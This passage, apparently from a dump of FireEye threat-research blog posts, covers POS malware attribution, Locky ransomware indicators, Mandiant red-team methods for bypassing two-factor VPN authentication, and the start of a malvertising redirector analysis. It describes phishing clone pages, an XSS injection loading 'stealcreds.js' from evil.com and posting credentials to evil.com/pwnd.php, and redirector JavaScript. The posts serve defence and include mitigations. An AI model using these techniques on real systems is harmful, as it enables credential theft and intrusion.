      <td valign=""top"" width=""185""><p>2dfddbc240cd6e320f69b172c1e3ce58</p> </td> <td valign=""top"" width=""122""><p>logmeinrescue.us.com</p> </td> <td valign=""top"" width=""136""><p>/system/oauth/gate.php</p> </td> </tr></tbody></table>
 <p>Table 2: TREASUREHUNT v0.1.1 hashes and Cnc details</p>
 <h5>Timeline</h5>
 <p>Because the TREASUREHUNT samples we’ve observed all have the same
  compile time, we need an alternate means to determine a timeline of
  the malware’s development and use. We used the dates when the malware
  samples were first seen by VirusTotal or by FireEye’s Dynamic Threat
  Intelligence (DTI) along with the domain registration date of the CnC
  server (if applicable). Based on those dates, the earliest identified
  sample was observed two months after the October 2014 compile date.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/TREASUREHUNT%20Villanueve/Fig2.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Timeline of TREASUREHUNT activity</span></p>
 <p>Using this data, TREASUREHUNT appears to have been first deployed in
  late 2014 and was seen throughout 2015 and into 2016.</p>
 <p>The relatively sparse sample set may indicate that TREASUREHUNT is
  being deployed in a targeted manner rather than being propagated indiscriminately.</p>
 <h5>
  <b>Underground Connections</b></h5>
 <p>TREASUREHUNT contains an interesting string that points to possible
  underground connections:</p>
 <p style=""text-align: center;"">        TreasureHunter version 0.1
  Alpha, created by Jolly Roger<br />         (jollyroger@prv.name) for
  BearsInc. Greets to Xylitol and co.</p>
 <p>The reference to “BearsInc” is an indication that TREASUREHUNT was
  developed exclusively for a specific cybercrime operation. BearsInc is
  an actor on an underground cybercrime forum dedicated to credit card
  fraud. BearsInc has advertised stolen payment card information for sale.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/TREASUREHUNT%20Villanueve/Fig3.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: An advertisement by BearsInc on an
    underground forum</span></p>
 <p>The developer of TREASUREHUNT identifies as “Jolly Roger” and uses
  the email address jollyroger@prv.name. Consistent with the pirate
  theme, the web interface through which compromised computers are
  controlled makes use of the icon seen in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/TREASUREHUNT%20Villanueve/favicon.jpg"" />
  <span class=""type-XS"">
    <br /> Figure 4: Icon seen in web interface</span></p>
 <p>The “Jolly Roger” alias and the pirate theme are reminiscent of a
  malware family from 2013 known as the <a href=""http://malware.dontneedcoffee.com/2013/10/jolly-roger-stealer-c-panel.html"">Jolly
    Roger Stealer</a>. This malware was advertised by “SynapseSoft”
  using the email addresses jr@exploit.im and jolly_roger@pandion.im.
  The connection between this “Jolly Roger” and the author of
  TREASUREHUNT remains unclear and there are no significant code
  overlaps among the two.</p>
 <p>Xylitol is a security researcher who has frequently exposed malware
  operators and this reference is likely a taunt directed at the
  security community.</p>
 <h5>
  <b>Conclusion</b></h5>
 <p>In the world of POS threats, there has been a rise in both
  underground offerings as well as new malware found in active use. The
  demand is likely due to the ongoing transition to EMV chip and PIN
  technology in the United States, which will eventually render these
  techniques largely useless. While some cybercriminals are looking
  ahead in an effort to develop ways to exploit chip and PIN (as well as
  near-field communication technologies), many cyber criminals are
  looking take advantage of memory scraping POS malware while it still works.</p>
 <p>With an increasing number of major firms transitioning to the more
  secure chip-enabled cards, we expect to see cyber criminals
  increasingly turn their attention to smaller retailers and banks that
  may not be as prepared for the transition.</p>
 <p>This article originally appeared on Visa Threat Intelligence,
  powered by FireEye. Click here for more information on <a href=""https://www.fireeye.com/content/fireeye-www/en_US/partners/strategic-technology-partners/visa-fireeye-cyber-watch-program.html"" target=""_blank"">Visa
    Threat Intelligence, powered by FireEye</a>.<br /> </p>
 <p>
  <span class=""type-XS"">[1] Mandiant’s <a href=""https://www2.fireeye.com/rs/fireye/images/rpt-m-trends-2015.pdf"">2015
      M-Trends report</a> notes that as more retailers adopt EMV
    technology, threat actors appear to sidestepping EMV and shifting to
    “softer targets” including retailers still using traditional POS
    systems, e-commerce companies, and payment processors.</span></p>",http://www.fireeye.com/blog/threat-research/2016/03/treasurehunt_a_cust.html
Surge in Spam Campaign Delivering Locky Ransomware Downloaders,"<p>FireEye Labs is detecting a significant spike in Locky ransomware
  downloaders due to a pair of concurrent email spam campaigns impacting
  users in over 50 countries. Some of the top affected countries are
  depicted in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20Haowei%20Ren/figure1.jpg"" />
  <span class=""type-XS"">Figure 1. Affected countries</span></p>
 <p>As seen in Figure 2, the steep spike starts on March 21, 2016, where
  Locky is running campaigns that coincide with the new Dridex campaigns
  that were discussed in the blog, <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/03/stop_scanning_mymac.html"" target=""_blank"">“Stop
    Scanning My Macro”.</a></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20Haowei%20Ren/figure2.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Detection on spam delivered malware</span></p>
 <p>Prior to Locky’s emergence in February 2016, Dridex was known to be
  responsible for a relatively higher volume of email spam campaigns.
  However, as shown in Figure 3, we can see that Locky is catching up
  with Dridex’s spam activities. This is especially true for this week,
  as we are seeing more Locky-related spam themes than Dridex. On top of
  that, we also are seeing Dridex and Locky running campaigns on the
  same day, which resulted in an abnormal detection spike.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20Haowei%20Ren/figure3.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Dridex versus Locky spam campaign over time</span></p>
 <h5>Locky Ransomware spam </h5>
 <p>The new Locky spam campaign uses several themes such as “invoice
  notice”, “attached image”, and “attached document themes”. See Figure
  4 and Figure 5 for example campaign emails.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20Haowei%20Ren/figure4.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 4. Urgent Invoice Campaign</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20Haowei%20Ren/figure5.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. Other Campaigns</span></p>
 <p>The ZIP attachment as depicted in Figure 6 contains a malicious
  JavaScript downloader that downloads and installs the Locky ransomware.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20Haowei%20Ren/figure6.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Zipped Content</span></p>
 <p>In Figure 7, it is interesting to see that the recent Locky campaign
  seems to prefer using a JavaScript-based downloader in comparison to
  Microsoft Word and Excel macro-based downloaders, which were seen
  being used in its early days.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20Haowei%20Ren/figure7.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 7. Locky Downloader Mechanism</span></p>
 <p>The preference for JavaScript downloaders could be due to the ease
  to transform or obfuscate the script via automation to generate new
  variants as depicted in Figure 8. As a result, the traditional
  signature-based solution may not keep up with the variants where its
  behavioral intent is the same. At the time of discovery, most of the
  samples that we see are being detected by only one vendor, according
  to VirusTotal.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20Haowei%20Ren/figure8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. Obfuscated JavaScript code</span></p>
 <h5>Conclusions</h5>
 <p>The volume of Locky ransomware downloaders observed is increasing
  and it may potentially replace the Dridex downloader as the top
  spammer. One of the latest victims of Locky is Methodist Hospital<a name=""_ftnref1""></a>[1], where the victim was reportedly forced to pay
  a ransom to retrieve their encrypted data. This suggests that the
  cybercriminals are earning more from ransomware and this drives their
  aggressive campaigns.</p>
 <p>On top of that, JavaScript downloaders seem to be the preferred
  medium for delivering its payload as it could be easily obfuscated to
  create new variants.</p>
 <h5>Technical Analysis of a Locky Payload Sample</h5>
 <p>MD5 Sum: 3F118D0B888430AB9F58FC2589207988 (First seen on 2016-02-24
  in VirusTotal)</p>
 <h5>Persistence Mechanism</h5>
 <ul> <li>The malware does not contain a persistence mechanism. An
    external tool or installer is required if the attacker desires
  persistence.</li> <li>The malware contains the ability to install the
    following registry key for persistence; this functionality is
    disabled in this variant.<ul>
          <li>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Locky<ul>
          <li>&lt;path_to_malware&gt;</li> </ul> </li> </ul> </li> </ul>
 <h5>File System Artifacts</h5>
 <ul> <li>The malware encrypts files on the system and creates new files
    with the encrypted contents in the same directory with the following
    naming convention:<ul> <li>&lt;system identifier&gt;&lt;16 random
        hex digits&gt;.locky</li> <li>The &lt;system identifier&gt;
        value is the ASCII hexadecimal representation of the first eight
        bytes of the MD5 hash of the GUID of the system volume.</li>
    </ul> </li> <li>The malware drops a ransom note provided by the C2
    server in all directories with encrypted files and on the desktop of
    the current user:<ul> <li>_Locky_recover_instructions.txt</li> </ul>
  </li> <li>The malware drops an image on the desktop of the current
      user:<ul> <li>_Locky_recover_instructions.bmp</li> </ul> </li> </ul>
 <h5>Registry Artifacts</h5>
 <ul> <li>The malware creates the registry key HKCU\Software\Locky.<ul>
        <li>id is set to a unique identifier generated for the
        compromised system.</li> <li>pubkey is set to a binary buffer
        that contains a public RSA key.</li> <li>paytext is set to a
        binary buffer containing the recovery instructions.</li>
        <li>completed is set to 1.</li> </ul> </li> <li>The malware
    changes the desktop background to a bitmap containing the ransom
      instructions.<ul> <li>HKCU\Control Panel\Desktop\Wallpaper is set
        to:
      %CSIDL_DESKTOPDIRECTORY%\_Locky_recover_instructions.bmp</li>
    </ul> </li> </ul>
 <h4>Network-Based Signatures</h4>
 <h5>Command and Control (CnC)</h5>
 <ul> <li>The malware communicates with the following hard-coded hosts
    using HTTP over TCP port 80. The malware also uses a domain name
    generation algorithm as described below.<ul> <li>188.138.88.184</li>
      <li>31.41.47.37</li> <li>5.34.183.136</li> <li>91.121.97.170</li>
    </ul> </li> </ul>
 <h5>Beacon Packet</h5>
 <ul> <li>The malware beacon builds a HTTP POST request to /main.php as
    shown in Figure 9. The POST data is encoded using a custom
  algorithm.</li> </ul>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20Haowei%20Ren/figure9.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 9. HTTP POST request polling packet
    (general packet structure)</span></p>
 <h5>Domain Generation Algorithm (DGA)</h5>
 <p>This sample contains a domain name generation algorithm that is
  based on the current month, day and year. There are eight possible
  domains per day and the domains change on the first of the month and
  on even numbered days. Figure 10 contains Python code to generate the
  eight possible domain names for the current date.</p>
 <p> </p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Ransomware%20Haowei%20Ren/figure10.jpg"" /></p>
 <p>
  <br /> <span class=""type-XS"">Figure 10. Locky Domain Generation Algorithm</span>
  <br /> </p>
 <p>[1] http://arstechnica.com/security/2016/03/kentucky-hospital-hit-by-ransomware-attack/</p>
 <p> </p>
 <p> </p>
 <p> </p>
 <p> </p>
 <p> </p>
 <p> </p>
 <p> </p>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2016/03/surge_in_spam_campai.html
99 Problems but Two-Factor Ain’t One,"<p>Two-factor authentication is a best practice for securing remote
  access, but it is also a Holy Grail for a motivated red team. Hiding
  under the guise of a legitimate user authenticated through multiple
  credentials is one of the best ways to remain undetected in an
  environment. Many companies regard their two-factor solutions as
  infallible and do not take precautions to protect against attackers’
  attempts to bypass or backdoor them.</p>
 <p></p>
 <p>The techniques covered in this blog range from simple to advanced
  methods of handling two-factor authentication from the perspective of
  a red team, and provide insight into potential visibility gaps for
  security teams to address. I’ll discuss techniques for bypassing
  two-factor authentication remotely without access to the internal
  environment, and how to gain access to a two-factor authenticated
  remote access device with information stolen from the internal environment.</p>
 <h3>1) K.I.S.S - Keep It Simple, Stupid</h3>
 <p>Compromising a remote access solution is a red team’s foremost goal
  because it offers easy access and a low risk of being caught. Red
  teams using legitimate remote access solutions can conduct their
  command, control, exploitation, and exfiltration activities under the
  guise of properly authenticated sessions. In addition, the red team’s
  system is not subject to the same security restrictions or controls as
  other corporate systems. This means that the team does not have to
  deal with antivirus, application whitelisting, and other intrusion
  detection software interfering with their activities. Two-factor
  authentication obviously raises the difficulty to compromise these
  remote access solutions, and challenges red teams to subvert the
  two-factor protections in place.</p>
 <p>In difficult situations like these, it’s best to adopt an Occam’s
  razor approach and use the most straightforward method to acquire the
  credentials we need: ask the victim to enter them for us. The perfect
  trap happens to be the simplest to set.</p>
 <p>In Figure 1, we have two different VPN login pages. One is a
  corporation’s legitimate site, the other is a fake operated by a
  crafty red team. Can you spot the difference?</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baker%20blog%20-%20red%20team/fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: VPN authentication page comparison</span></p>
 <p>No? Neither can your users. Using tools such as the Social-Engineer
  Toolkit (SET), anyone can effectively replicate an external page by
  changing the HTML’s local resource locations (“/home/image/logo.png”)
  to external references (“mycompany.com/home/image/logo.png”). With a
  compelling phishing scenario, you can guide the victim to your visual
  clone VPN authentication page and get all the information you need to
  make your own connection: username, password, and even the token code!</p>
 <p>If the red team can move quickly enough, they can take credentials
  submitted to the fake VPN page and use them to authenticate to the
  actual VPN. As shown in Figure 2, this can be accomplished by
  redirecting the login submission to a PHP script that will write the
  username, password and other metadata (IP address, HTTP User-Agent,
  time of submission) to a log file that the red team can monitor and
  wait for a user to provide their two-factor credentials.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baker%20blog%20-%20red%20team/fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Credential theft PHP POST script</span></p>
 <p>Once the red team authenticates to the VPN, they can attempt to
  escalate privileges and access sensitive data before the security team
  can detect and respond to the phish. Internal network reconnaissance
  through scanning, identifying applications and systems that the victim
  user can access, and even LLMNR/NBT-NS spoofing offer potential
  avenues to turn a VPN session into full compromise of the environment.</p>
 <p>The Mandiant Red Team leverages SpiderLabs’ Responder as our
  LLMNR/NBT-NS spoofing tool of choice. Responder is a powerful Python
  utility that sends fake responses to LLMNR/NBT-NS requests to fool
  systems and services into providing password hashes and, in some
  cases, plaintext credentials. Running Responder on a VPN subnet for
  even a few minutes (as exemplified in Figure 3) can provide numerous
  domain accounts and password hashes. Common passwords and passwords
  with low complexity requirements can have their hashes cracked in
  seconds, giving the red team the plaintext credentials they need to
  continue their lateral movement and privilege escalation.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baker%20blog%20-%20red%20team/fig3.png"" />
  <span class=""type-XS"">
    <br /> Figure 3: Responder example</span></p>
 <h5>
  <b>How to prevent this attack</b></h5>
 <ol> <li>Ensure that your VPN solution enforces a single authenticated
    session per user. There is limited justification for allowing
    multiple, concurrent sessions (with different source IP addresses)
    for a single user account.</li> <li>Conduct regular auditing of VPN
    authentication logs to identify anomalous login activity, such as
    flagging login events originating from TOR exit nodes.</li> <li>When
    responding to phishing incidents, take the potential loss of
    credentials seriously. If there is reason to suspect credentials
    were lost, make sure to reset all affected credentials and review
    access logs for evidence of malicious activity.</li> </ol>
 <h3>2) XSS in Sheep’s Clothing</h3>
 <p>VPN login pages are valuable targets because their image evokes a
  sense of familiarity and security with the users. If you authenticate
  to the VPN every day using a web page such as the one shown in Figure
  1, odds are that you’re not inspecting your traffic or the website
  code to verify your credentials are going where you think they are.
  The scary truth is that real-world attackers have already started
  capitalizing on this implicit trust and have been discovered
  leveraging JavaScript-based credential harvesters on corporate VPN
  login pages.</p>
 <p>Let’s discuss how this attack works. First, the red team exploits a
  vulnerability to write code to the authentication page (or a page that
  gets loaded by the authentication page), such as the vulnerability
  discussed in CVE-2014-3393. The red team then adds code to the
  authentication page to execute malicious JavaScript from a system they
  control and waits for unsuspecting users to load the page and
  authenticate. An example of such code is shown in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baker%20blog%20-%20red%20team/fig4.png"" />
  <span class=""type-XS"">Figure 4: Malicious code snippet</span></p>
 <p>The victim user does not notice anything different. This tiny bit of
  code loads file “stealcreds.js” from “https://www.evil.com” and
  executes its code into your legitimate user’s web session (i.e. the
  JavaScript code runs in the context of the user’s browser). By using
  an external resource, we minimize code introduction on the front page
  and allow ourselves the ability to dynamically update our payload each
  time a user’s browser requests the resource. Figure 5 shows a snippet
  of code we use to compromise user credentials.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baker%20blog%20-%20red%20team/fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Code snippet for stealing VPN creds</span></p>
 <p>Using an internal frame insertion and a POST-back setup to
  “https://www.evil.com/pwnd.php”, the red team rigs the normal VPN
  login page to POST user credentials every time they are entered in a
  session where the “stealcreds.js” resource is loaded. By attacking the
  VPN solution itself, the red team can disguise themselves as
  legitimate users remotely connecting to the environment through the
  authorized remote access solution.</p>
 <h5>
  <b>How to prevent this attack</b></h5>
 <p>Monitor access to your two-factor solutions and conduct regular
  examinations of any code served to users to ensure that no tampering
  has occurred. Two ways to accomplish this are to use a file integrity
  monitoring solution to monitor files served by networking devices and
  by conducting periodic scans or assessments of public infrastructure
  to identify changes.</p>
 <h3>3) 1.5-Factor Authentication</h3>
 <p>Another popular VPN configuration is a “host check” process as a
  requirement to connect to the corporate VPN. Typically, this process
  verifies the host’s domain and some basic configuration stats, such as
  whether or not antivirus signatures have been updated. Some companies
  view this “host check” process as a pseudo-second factor (hence the
  1.5 factor title). The unfortunate issue with host inspections is that
  they rely on the host being trustworthy.\</p>
 <p>We performed a red team assessment on a client that used a VPN
  device that required only a single-factor password authentication in
  addition to the “host check” process. Every piece of information
  examined by the “host check” process was provided in a web request and
  minimally obfuscated with Base64 encoding – fair game to anyone using
  a proxy. An example of the kind of data expected, complete with
  registry paths checked and the “correct answers,” is shown in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baker%20blog%20-%20red%20team/fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: &quot;host checker” policy from VPN
    authentication server</span></p>
 <p>Not only does the “host check” process rely on trustworthy answers
  from potentially untrustworthy sources, it even provides what it’s
  inspecting within the request! At a minimum, a red team can attempt to
  modify the features examined during the check. Even worse, the
  response to the “host check” was a simple POST containing whether each
  inspected element was “correct” or not – another easy target for red
  teams using web proxies such as Fiddler or Burp.</p>
 <p>We used a combination of Fiddler and Python to modify POST requests
  to generate a valid policy inspection report and fool the “host check”
  into approving us, as shown in Figure 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baker%20blog%20-%20red%20team/fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Python-generated policy report</span></p>
 <p>Another common form of 1.5-factor authentication is leveraging
  usernames and passwords in combination with a computer certificate.
  Some companies choose to authenticate both the user and their device
  before allowing remote access. While this is a good approach,
  requiring single-factor credential authentication in combination with
  a locally installed certificate is not. It is trivial for an attacker
  to gain access to an end user system, export the locally installed
  computer certificate, and install the certificate on their own virtual system.</p>
 <h5>
  <b>How to prevent this attack</b></h5>
 <p>Do not use single factor or 1.5-factor authentication for any remote
  access. Only strong multi-factor authentication (something you know,
  something physical you have, or something you are) should be
  implemented. If you want to leverage computer certificate in
  conjunction with credential-based authentication, make sure you use
  multi-factor credential-based authentication in conjunction with a
  client-side certificate.</p>
 <h3>4) Email is the Enemy</h3>
 <p>Digital tokens often require a synchronization code that is unique
  to each user’s token in order to function properly. The
  synchronization code and algorithm is what ensures the token that is
  displayed to the user matches the token the authentication server
  expects. Many companies use a simple IT-friendly process of sending
  users a notice via email when their request for VPN access is
  approved. These emails often contain the “seed” key and instructions
  for installation. Unfortunately for the security team, users often
  read this email and forget to delete it, leaving the literal keys in
  the users inbox, ripe for an attacker to steal.</p>
 <p>One of the steps in the Mandiant Red Team methodology is to search
  email inboxes (including.PST and .OST files on disk), for these types
  of sensitive and useful files. In most cases, we use a simple
  PowerShell script to search the user’s mailbox and related files for
  evidence of RSA soft-token .sdtid files.</p>
 <p>The .sdtid file is essentially a password-protected certificate of
  authenticity you can use to set up a digital (“soft”) token on your
  local host. With the combination of both the .sdtid file and password
  (often located in the same email sent by your IT Help Desk, stored in
  a local text file, or stored in a local password manager), the red
  team can replicate a user’s soft-token and use a simple keylogger to
  identify the user’s PIN. After that, the red team gains two-factor
  authenticated access to the network at any time, day or night,
  masquerading as a legitimate user.</p>
 <h5>
  <b>How to prevent this attack</b></h5>
 <p>Innocuous things such as a soft certificate in an email can help an
  attacker gain access to a company. “Soft” tokens are often easier
  targets for compromise than physical devices, so keep that in mind
  when you decide what and how you are securing with two-factor. Train
  your users to securely delete sensitive information once they’re done
  with it. Train your IT staff to not include passwords in the same
  emails as the .sdtid file or not to include the .sdtid in an email.
  For instance, require your users to authenticate to a website to
  download the .sdtid file.</p>
 <h3>5) Leaving the Vault Key under the Doormat</h3>
 <p>“Password vault” is a phrase that will inspire groans from even the
  most hardened red team veterans. A properly configured password vault
  is a powerful tool to restrict and monitor the usage of credentials in
  an environment. It reduces exposure of passwords to traditional tools
  such as Mimikatz and Windows Credentials Editor (WCE). After all,
  dumping passwords becomes a tired game when all administrative
  credentials change every time they are checked in and out of the vault.</p>
 <p>Add a multi-factor-enabled RADIUS authentication server with
  physical tokens in front of that password vault and you’ve created a
  real challenge for a red team. In order for a red team to get a
  temporarily valid password, they now need to reproduce a user
  password, PIN and physical token code – all at once! Even with local
  access via a backdoor and a keylogger, the red team likely still won’t
  be able to enter that token code in time before the RADIUS server
  shuts down access because the token has already been used.</p>
 <p>However, rather than give up at bypassing the highest level of
  password security that can be realistically implemented, a red team
  can return to the fundamental rule of security: your security chain is
  only as strong as its weakest link, and that weakest link is almost
  always the people involved in the processes. This is where we start to
  explore the unsecured Windows file share.</p>
 <p>Unsecured Windows file shares have served our Red Team well over the
  years. We almost always get at least some of the data necessary for
  privilege escalation and sensitive data theft by combing through
  unsecured file shares. Unfortunately for security teams, Windows makes
  it incredibly easy to share files and folders in a domain and for a
  user or red team to discover those shares and scrape through them for
  valuable information. PowerView’s “Invoke-ShareFinder” PowerShell
  script is a great utility that offers a fair amount of scalability in
  the hunt for shares of interest. This tool can help you discover
  valuable information, including interesting shares such as one we
  recently found named “Security”. As expected, this share was readable
  to any user with valid domain credentials.</p>
 <p>In some cases, you may find yourself looking at a document such as
  the one shown in Figure 8.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baker%20blog%20-%20red%20team/fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Sample Excel spreadsheet</span></p>
 <p>Passwords discovered in these types of documents give red team’s
  direct access to the authentication server, which means they can
  control how the authentication process works. With the password to the
  account used to administer the two-factor authentication solution, the
  red team can grant themselves – at least temporarily – access to any
  existing account’s password vault. As the next section shows, with
  this level of access comes new techniques to further entrench the red
  team’s control of critical infrastructure in an environment to
  maintain access and evade detection.</p>
 <h5>
  <b>How to prevent this attack</b></h5>
 <p>Restrict users’ abilities to create arbitrary open Windows shares by
  restricting local administrator permissions. There is almost no reason
  for real information to be stored in a location where it is accessible
  to “Everyone” (i.e. any domain user). Use Active Directory Groups to
  your advantage to define tight access controls where sensitive
  information may be. Consider implementing a Data Loss Prevention (DLP)
  solution that maintains encryption of sensitive files and audits their
  access and modification. You can even take the “Invoke-ShareFinder”
  script and do a quick self-assessment in a day or two - keep an eye
  out for shares on web servers or corporate data shares.</p>
 <h3>6) A Two-Factor Emergency</h3>
 <p>Many two-factor authentication products offer what are called
  “Emergency Access” codes, an authentication mechanism designed to
  allow VPN access after a user has lost their token and remote access
  is critical. An example screenshot depicting emergency access token
  code management is shown in Figure 9.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baker%20blog%20-%20red%20team/fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Emergency token code access management screenshot</span></p>
 <p>As the screenshot above shows, the system offers a fixed “second
  factor” of authentication – perfect for the red team that wants
  stealthy remote access to the environment. These emergency access
  codes are particularly dangerous because they can be configured with
  no expiration date, allowing for a quiet return into the environment
  at a later date.</p>
 <p>A word of caution for eager red teams: while creating your own
  profile/token using this access is tempting, there is typically more
  alerting and auditing around the creation of profiles than the
  modification of existing profiles.</p>
 <p>As every vendor solution is different, we’ll leave it as an exercise
  to the reader to determine the proper method of implementing
  “Emergency Access” in their target environment. Keep in mind that if
  you’re using an existing user’s account, emergency access may not
  always be enough – the PIN is required in addition to the emergency
  access code. Fortunately, most vendors offer the option to quickly
  clear the PIN and set a new one, as depicted in Figure 10.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Baker%20blog%20-%20red%20team/fig10.png"" />
  <span class=""type-XS"">
    <br /> Figure 10: PIN management screenshot</span></p>
 <h5>
  <b>How to prevent this attack</b></h5>
 <p>Implement regular two-factor application auditing. Log the user that
  logs in, the date of the login, where the login originated, and the
  changes that were made, especially if the changes involved the
  creation of new user profiles. Enforce policies that disallow
  emergency token access except in the direst of needs, and even then
  only allow this access for a short period. We highly recommend you
  perform a quick audit of all your two-factor authenticated accounts
  right now – you might be surprised what you find.</p>
 <h3>Conclusion</h3>
 <p>There are many attack paths and vectors that veteran red teams can
  use to bypass “secure” security controls. At Mandiant, our Red Team
  takes advantage of our front line intelligence, as well as the latest
  tools, tactics, and procedures we see our adversaries leverage in
  their own breaches.</p>
 <p>Unfortunately, many companies place too much trust in security
  solutions such as two-factor authentication without taking the
  necessary steps to secure the underlying technologies. This oversight
  could allow attackers and red teams alike to subvert two-factor
  authentication implementations even when they’re implemented properly.</p>
 <p>Special thanks to Andrew Burkhardt, Evan Peña, and Justin Prosco for
  their help with the content of this blog.</p>",http://www.fireeye.com/blog/threat-research/2016/03/99_problems_but_two-.html
Wiping Out a Malicious Campaign Abusing Chinese Ad Platform,"<p>At FireEye Labs, we have discovered another well-crafted malvertising
  campaign that uses the ad API of one of the world’s largest search
  engines: China-based Baidu. The attacker employs a simple HTML
  redirector instead of shellcode or an exploit in an apparently
  benign-looking website. This leads to a redirection loop fetching
  malicious content from compromised ad slots, which starts dropping
  malwares in a chain on the infected machine. This malvertising
  campaign involving Baidu’s API has been designed in a way so that its
  actual source is hard to trace back.</p>
 <p>The campaign was first seen in the middle of October 2015, and
  instances of the threat were still active as of February. Baidu took
  several steps to address the issue following FireEye’s responsible
  disclosure, but at the time, Internet surfers who navigated to an
  infected page for this campaign – such as <b>hxxp://www.duds[.]win</b>
  – would be redirected to the following URL:</p>
 <p>
  <b>hxxp://www.ymnemh[.]info/index.htm</b></p>
 <p>There are two parts of the obtained response.</p>
 <h5>Setting up a redirection loop:<u></u>
  <b></b></h5>
 <p>In first part of response, the code creates a number of tracking
  cookies using JavaScript, which keeps track of the current time and
  number of visits to the page. Said script is given in <b>
    <i>Code Listing 1</i></b> for reference:</p>
 <p>
  <span class=""code"">&lt;script&gt;</span>
  <br /> <span class=""code"">function getCookieVal(offset) {</span>
  <br /> <span class=""code"">    var endstr =
    document.cookie.indexOf(&quot;;&quot;, offset);</span>
  <br /> <span class=""code"">    if (endstr == -1)</span>
  <br /> <span class=""code"">        endstr = document.cookie.length;</span>
  <br /> <span class=""code"">    return
    unescape(document.cookie.substring(offset, endstr));</span>
  <br /> <span class=""code"">}</span>
  <br /> <span class=""code"">function GetCookie(name) {</span>
  <br /> <span class=""code"">    var arg = name + &quot;=&quot;;</span>
  <br /> <span class=""code"">    var alen = arg.length;</span>
  <br /> <span class=""code"">    var clen = document.cookie.length;</span>
  <br /> <span class=""code"">    var i = 0;</span>
  <br /> <span class=""code"">    while (i &lt; clen) {</span>
  <br /> <span class=""code"">        var j = i + alen;</span>
  <br /> <span class=""code"">        if (document.cookie.substring(i, j)
    == arg)</span>
  <br /> <span class=""code"">            return getCookieVal(j);</span>
  <br /> <span class=""code"">        i = document.cookie.indexOf(&quot;
    &quot;, i) + 1;</span>
  <br /> <span class=""code"">        if (i == 0)</span>
  <br /> <span class=""code"">            break;</span>
  <br /> <span class=""code"">    }</span>
  <br /> <span class=""code"">    return null;</span>
  <br /> <span class=""code"">}</span>
  <br /> <span class=""code"">function SetCookie(name, value) {</span>
  <br />     <span class=""code"">var argv = SetCookie.arguments;<br />
        var argc = SetCookie.arguments.length;<br />      var expires =
    (2 &lt; argc) ? argv[2] : null;<br />      var path = (3 &lt; argc)
    ? argv[3] : null;<br />      var domain = (4 &lt; argc) ? argv[4] :
    null;<br />      var secure = (5 &lt; argc) ? argv[5] : false;<br />
        document.cookie = name + &quot;=&quot; + escape(value) +</span>
  <br /> <span class=""code"">        ((expires == null) ? &quot;&quot; :
    (&quot;; expires=&quot; + expires.toGMTString())) +<br />         
    ((path == null) ? &quot;&quot; : (&quot;; path=&quot; + path))
    +<br />          ((domain == null) ? &quot;&quot; : (&quot;;
    domain=&quot; + domain)) +<br />          ((secure == true) ?
    &quot;; secure&quot; : &quot;&quot;);<br />  }<br />  function
    DisplayInfo() {<br />      var expdate = new Date();<br />      var
    visit;<br />      // Set expiration date to a year from now.<br />
        expdate.setTime(expdate.getTime() + (24 * 60 * 60 * 1000 *
    365));<br />      if (!(visit = GetCookie(&quot;visit&quot;)))<br />
            visit = 0;<br />      <b>visit++</b>;<br />     
    SetCookie(&quot;visit&quot;, visit, expdate, &quot;/&quot;, null,
    false);<br />      var url = &quot;&quot;;<br />      if (visit ==
    2) url =
    &quot;<b>hxxp://www.ymnemh[.]info/index2.htm</b>&quot;;<br />     
